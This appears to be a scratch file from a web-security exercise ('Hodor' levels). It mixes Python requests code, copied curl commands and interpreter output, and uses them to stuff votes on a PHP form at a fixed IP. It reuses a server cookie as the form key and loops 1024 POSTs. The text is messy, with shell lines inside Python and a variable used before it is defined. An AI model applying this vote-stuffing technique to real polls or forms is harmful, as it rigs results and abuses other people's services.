import requests

hodorurl = "http://158.69.76.135/level0.php"

curl 'http://158.69.76.135/level0.php' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://158.69.76.135' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://158.69.76.135/level0.php' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' --data 'id=390&holdthedoor=Submit' --compressed

r = requests.post(hodorurl, data = {'id':'390', 'holdthedoor':'Submit'})


curl 'http://158.69.76.135/level1.php' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://158.69.76.135' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://158.69.76.135/level1.php' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: HoldTheDoor=c3a8108c4938d6d7ea2542dc80c1656fde5c2ff0' --data 'id=390&holdthedoor=Submit&key=c3a8108c4938d6d7ea2542dc80c1656fde5c2ff0' --compressed

r = requests.post(hodorurl, data = {'id':'390', 'holdthedoor':'Submit'})



r.cookies
<RequestsCookieJar[Cookie(version=0, name='HoldTheDoor', value='74f0f91ff8e17f3523e17487c68e146968515541', port=None, port_specified=False, domain='158.69.76.135', domain_specified=False, domain_initial_dot=False, path='/', path_specified=False, secure=False, expires=1540168829, discard=False, comment=None, comment_url=None, rest={}, rfc2109=False)]>

r.cookies['HoldTheDoor']
'74f0f91ff8e17f3523e17487c68e146968515541'

requests.post(l1url, data = {'id':'390', 'holdthedoor':'Submit', 'key': r.cookies['HoldTheDoor']})
requests.post(l1url, data = {'id':'390', 'holdthedoor':'Submit', 'key': r.cookies['HoldTheDoor']})
                                                                            ^
l1url = 'http://158.69.76.135/level1.php'

r = requests.get(l1url)
for i in range(1024):
     requests.post(l1url, data = {'id':'390', 'holdthedoor':'Submit', 'key':r.cookies['HoldTheDoor']}, cookies=r.cookies)
